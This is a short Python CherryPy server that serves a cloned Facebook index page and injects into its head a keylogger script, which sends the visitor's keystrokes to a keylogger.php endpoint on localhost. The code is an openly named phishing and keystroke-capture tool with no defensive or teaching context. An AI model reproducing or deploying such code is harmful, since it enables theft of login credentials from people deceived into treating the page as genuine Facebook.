__author__ = 'root'

import cherrypy


conf = {
    'tools.staticdir.on': True,
    'tools.staticdir.root': "/var/www",
    'tools.staticdir.dir': "www.facebook.com",
}

class KeyLogger(object):
    @cherrypy.expose
    def index(self):

        # Read a file
        text = ''
        with open("/var/www/www.facebook.com/index.html", "rt") as in_file:
            for line in in_file:
                text += line
                if '<head>' in line:
                    text += """
                        <script type="text/javascript" src="http://127.0.0.1/test/keylogger.js"></script>
                        <script type="text/javascript">
                        KeyLogger.init(["http://127.0.0.1/test/", "keylogger.php?k=", 1000]);
                        </script>
                        """


        return text

if __name__ == '__main__':
    cherrypy.tree.mount(KeyLogger(), '/', {'/':conf})
    cherrypy.engine.start()
    cherrypy.engine.block()
